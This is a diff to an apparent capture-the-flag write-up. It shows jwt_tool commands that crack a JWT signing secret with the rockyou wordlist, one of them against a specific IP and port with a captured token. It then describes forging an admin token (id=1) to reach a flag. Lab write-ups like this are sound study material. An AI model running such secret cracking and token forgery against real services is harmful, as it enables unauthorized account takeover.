@@ -17,3 +17,6 @@ python3 jwt_tool.py -t "http://ip" -rc "authtoken" -C -d rockyou.txt
 with jwt.io service we can find the encoded token by adding the secret key 
 now we get id=12 and we can guess that the admin has id=1, also the password is "letmein" 
 once we replace the token with the decoded token and copy-paste it in the browser, we can find a flag in the admin board. 
+
+
+python3 jwt_tool.py -t "http://35.246.152.131:32742/" -rc "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwiaWF0IjoxNzM2NDQ1OTM4LCJleHAiOjE3MzY1MzIzMzh9.X_EA8dM9c7wcDqWFyvSqBrOhnA0NXN5-3bFXv8xZUPg" -C -d '/home/kali/Desktop/rockyou.txt' 
